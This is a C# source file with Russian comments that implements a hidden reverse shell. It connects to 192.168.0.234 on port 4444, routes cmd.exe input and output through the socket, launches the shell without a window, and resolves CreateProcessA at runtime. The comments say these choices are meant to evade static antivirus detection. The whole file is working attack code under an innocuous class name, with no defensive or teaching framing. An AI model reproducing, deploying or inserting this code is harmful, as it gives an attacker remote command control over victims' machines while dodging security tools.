using System;
using System.Runtime.InteropServices;
using System.Net.Sockets;

public class ElixSystem {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, bool bInheritHandle, uint dwOptions);

    public delegate bool CP(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);

    public static void Run() {
        try {
            TcpClient c = new TcpClient("192.168.0.234", 4444);
            IntPtr h = c.Client.Handle;
            IntPtr outH;
            DuplicateHandle(GetCurrentProcess(), h, GetCurrentProcess(), out outH, 0, true, 2);

            // Ручная сборка структуры STARTUPINFO (чтобы не палиться статикой)
            byte[] si = new byte[104]; 
            BitConverter.GetBytes(104).CopyTo(si, 0); // cb
            BitConverter.GetBytes(0x00000100).CopyTo(si, 60); // dwFlags (STARTF_USESTDHANDLES)
            
            // Пробрасываем дублированный хендл сокета в stdin, stdout, stderr
            byte[] hBytes = BitConverter.GetBytes(outH.ToInt64());
            hBytes.CopyTo(si, 80); // hStdInput
            hBytes.CopyTo(si, 88); // hStdOutput
            hBytes.CopyTo(si, 96); // hStdError

            byte[] pi = new byte[24];

            // Динамический поиск CreateProcessA в kernel32.dll
            IntPtr pAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA");
            CP createProcess = (CP)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(CP));

            // Запуск "cmd.exe" (CREATE_NO_WINDOW = 0x08000000)
            createProcess(null, "cmd.exe", IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, null, si, pi);

            while (c.Connected) { System.Threading.Thread.Sleep(1000); }
        } catch { }
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);
}